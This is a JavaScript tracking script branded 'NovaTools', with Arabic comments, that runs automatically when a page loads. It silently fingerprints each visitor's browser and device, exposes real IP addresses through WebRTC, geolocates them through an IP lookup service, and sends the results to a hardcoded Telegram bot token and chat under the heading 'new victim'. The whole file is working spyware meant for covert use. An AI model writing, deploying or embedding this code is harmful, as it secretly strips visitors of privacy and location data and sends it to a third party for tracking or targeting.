const TG_BOT_TOKEN = "8997821992:AAEmiPLNNKT5F0y99QWP6dY8qBTJYU3wo9Y";
const TG_CHAT_ID   = "8997821992";
/* ▲▲▲ املأ القيم هنا ▲▲▲ */

const fingerprint = { started: new Date().toISOString() };

/* 1) الأساسي */
function collectBasic() {
  const nav = navigator, scr = screen;
  fingerprint.basic = {
    userAgent:    nav.userAgent,
    platform:     nav.platform,
    language:     nav.language,
    languages:    nav.languages?.join(", "),
    vendor:       nav.vendor,
    cores:        nav.hardwareConcurrency || "?",
    memory:       nav.deviceMemory || "?",
    touchPoints:  nav.maxTouchPoints,
    cookiesOn:    nav.cookieEnabled,
    dnt:          nav.doNotTrack,
    online:       nav.onLine,
    url:          location.href,
    referrer:     document.referrer || "(direct)",
    timestamp:    new Date().toISOString()
  };
  fingerprint.screen = {
    width: scr.width, height: scr.height,
    availW: scr.availWidth, availH: scr.availHeight,
    colorDepth: scr.colorDepth, dpr: window.devicePixelRatio
  };
}

/* 2) WebGL */
function collectWebGL() {
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) { fingerprint.webgl = { available: false }; return; }
    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
    fingerprint.webgl = {
      vendor: gl.getParameter(gl.VENDOR),
      renderer: gl.getParameter(gl.RENDERER),
      unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
      unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null
    };
  } catch (e) { fingerprint.webgl = { error: String(e) }; }
}

/* 3) Canvas */
function collectCanvas() {
  try {
    const c = document.createElement("canvas");
    c.width = 280; c.height = 60;
    const ctx = c.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("NovaTools-fp-🦅", 2, 15);
    ctx.fillStyle = "rgba(102,204,0,.7)";
    ctx.fillText("NovaTools-fp-🦅", 4, 17);
    fingerprint.canvasHash = c.toDataURL().slice(-80);
  } catch (e) { fingerprint.canvasHash = "error"; }
}

/* 4) Audio */
function collectAudio() {
  try {
    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    if (!AC) return;
    const ctx = new AC(1, 44100, 44100);
    const osc = ctx.createOscillator();
    osc.type = "triangle"; osc.frequency.value = 10000;
    const comp = ctx.createDynamicsCompressor();
    osc.connect(comp); comp.connect(ctx.destination);
    osc.start(0);
    ctx.startRendering().then(buf => {
      const d = buf.getChannelData(0);
      let s = 0;
      for (let i = 4500; i < 5000; i++) s += Math.abs(d[i]);
      fingerprint.audioHash = s.toFixed(6);
    }).catch(() => {});
  } catch (e) {}
}

/* 5) WebRTC */
async function collectWebRTC() {
  return new Promise(resolve => {
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      const ips = new Set();
      pc.createDataChannel("");
      pc.onicecandidate = e => {
        if (!e.candidate) { pc.close(); fingerprint.webrtcIPs = [...ips]; return resolve(); }
        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
        if (m) ips.add(m[1]);
      };
      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => resolve());
      setTimeout(() => { pc.close(); fingerprint.webrtcIPs = [...ips]; resolve(); }, 3000);
    } catch (e) { resolve(); }
  });
}

/* 6) البطارية */
async function collectBattery() {
  try {
    if (!navigator.getBattery) return;
    const b = await navigator.getBattery();
    fingerprint.battery = {
      level: Math.round(b.level * 100) + "%",
      charging: b.charging
    };
  } catch (e) {}
}

/* 7) الشبكة */
function collectNetwork() {
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (c) fingerprint.network = {
    effectiveType: c.effectiveType, downlink: c.downlink,
    rtt: c.rtt, saveData: c.saveData
  };
}

/* 8) الخطوط */
function collectFonts() {
  const base = ["monospace","sans-serif","serif"];
  const test = ["Arial","Verdana","Times New Roman","Courier New","Georgia","Tahoma","Impact",
                "Comic Sans MS","Calibri","Cambria","Consolas","Segoe UI","Cairo","Tajawal",
                "Helvetica","Roboto","Ubuntu","Fira Code","JetBrains Mono"];
  const span = document.createElement("span");
  span.style.cssText = "position:absolute;left:-9999px;font-size:72px;";
  span.textContent = "mmmmmmmmmmlli";
  document.body.appendChild(span);
  const baseSizes = {};
  base.forEach(b => { span.style.fontFamily = b; baseSizes[b] = span.offsetWidth + "," + span.offsetHeight; });
  const found = [];
  test.forEach(f => {
    for (const b of base) {
      span.style.fontFamily = `'${f}',${b}`;
      if (span.offsetWidth + "," + span.offsetHeight !== baseSizes[b]) { found.push(f); break; }
    }
  });
  span.remove();
  fingerprint.fonts = found;
}

/* 9) الجيو */
async function collectGeo() {
  return new Promise(resolve => {
    fetch("https://ipapi.co/json/").then(r => r.json()).then(d => {
      fingerprint.geo = {
        ip: d.ip, city: d.city, region: d.region,
        country: d.country_name, postal: d.postal,
        lat: d.latitude, lon: d.longitude,
        isp: d.org, timezone: d.timezone
      };
      resolve();
    }).catch(() => resolve());
    setTimeout(resolve, 4000);
  });
}

/* 10) الأجهزة */
async function collectDevices() {
  try {
    const d = await navigator.mediaDevices.enumerateDevices();
    fingerprint.devices = d.map(x => `${x.kind}: ${x.label || "غير مصرح"}`);
  } catch (e) {}
}

/* 11) الصلاحيات */
function collectPermissions() {
  if (!navigator.permissions) return;
  const list = ["geolocation","notifications","camera","microphone","clipboard-read"];
  Promise.all(list.map(p =>
    navigator.permissions.query({ name: p }).then(r => `${p}=${r.state}`).catch(() => null)
  )).then(r => { fingerprint.permissions = r.filter(Boolean); });
}

/* 12) إرسال لتليجرام */
async function sendToTelegram() {
  const parts = [];
  parts.push("🦅 *NovaTools — ضحية جديدة*");
  parts.push("━━━━━━━━━━━━━━━━━━━━");
  parts.push(`📅 \`${fingerprint.basic?.timestamp}\``);

  if (fingerprint.geo) {
    parts.push("");
    parts.push("🌍 *جغرافيا*");
    parts.push(`• IP: \`${fingerprint.geo.ip}\``);
    parts.push(`• الدولة: ${fingerprint.geo.country} (${fingerprint.geo.region})`);
    parts.push(`• المدينة: ${fingerprint.geo.city}`);
    parts.push(`• ISP: ${fingerprint.geo.isp}`);
    parts.push(`• التوقيت: ${fingerprint.geo.timezone}`);
  }

  if (fingerprint.webrtcIPs?.length) {
    parts.push("");
    parts.push("📡 *IP حقيقي (WebRTC)*");
    fingerprint.webrtcIPs.forEach(ip => parts.push(`• \`${ip}\``));
  }

  parts.push("");
  parts.push("🖥 *النظام*");
  parts.push(`• UA: \`${(fingerprint.basic?.userAgent||"").slice(0,140)}\``);
  parts.push(`• المنصة: ${fingerprint.basic?.platform}`);
  parts.push(`• الأنوية: ${fingerprint.basic?.cores}`);
  parts.push(`• الذاكرة: ${fingerprint.basic?.memory} GB`);
  parts.push(`• اللغة: ${fingerprint.basic?.language}`);

  if (fingerprint.screen) {
    parts.push("");
    parts.push("📺 *الشاشة*");
    parts.push(`• ${fingerprint.screen.width}×${fingerprint.screen.height}`);
    parts.push(`• DPR: ${fingerprint.screen.dpr}`);
  }

  if (fingerprint.webgl) {
    parts.push("");
    parts.push("🎮 *كرت الشاشة*");
    parts.push(`• ${fingerprint.webgl.unmaskedVendor || fingerprint.webgl.vendor || "?"}`);
    parts.push(`• ${fingerprint.webgl.unmaskedRenderer || fingerprint.webgl.renderer || "?"}`);
  }

  if (fingerprint.battery) {
    parts.push("");
    parts.push("🔋 *البطارية*");
    parts.push(`• ${fingerprint.battery.level} | شحن: ${fingerprint.battery.charging ? "نعم" : "لا"}`);
  }

  if (fingerprint.network) {
    parts.push("");
    parts.push("🌐 *الشبكة*");
    parts.push(`• ${fingerprint.network.effectiveType} | ${fingerprint.network.downlink}Mbps | ${fingerprint.network.rtt}ms`);
  }

  if (fingerprint.fonts?.length) {
    parts.push("");
    parts.push(`🔤 *خطوط (${fingerprint.fonts.length})*`);
    parts.push(fingerprint.fonts.slice(0, 15).join(", "));
  }

  parts.push("");
  parts.push(`🎨 Canvas: \`${(fingerprint.canvasHash||"").slice(0,40)}\``);
  parts.push(`🔊 Audio: \`${fingerprint.audioHash || "..."}\``);
  parts.push(`🔗 ${fingerprint.basic?.url}`);

  const text = parts.join("\n");
  const chunks = text.match(/[\s\S]{1,3900}/g) || [];
  for (const chunk of chunks) {
    try {
      await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TG_CHAT_ID, text: chunk,
          parse_mode: "Markdown", disable_web_page_preview: true
        })
      });
      await new Promise(r => setTimeout(r, 350));
    } catch (e) {}
  }
}

/* التشغيل */
async function runCollector() {
  collectBasic();
  collectWebGL();
  collectCanvas();
  collectAudio();
  collectFonts();
  collectNetwork();
  collectPermissions();

  await Promise.all([
    collectWebRTC(),
    collectBattery(),
    collectGeo(),
    collectDevices()
  ]);

  await new Promise(r => setTimeout(r, 1200));
  await sendToTelegram();

  window.__nt_ready = true;
  window.__nt_fp = fingerprint;
  window.dispatchEvent(new Event("ntReady"));
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", runCollector);
} else {
  runCollector();
}
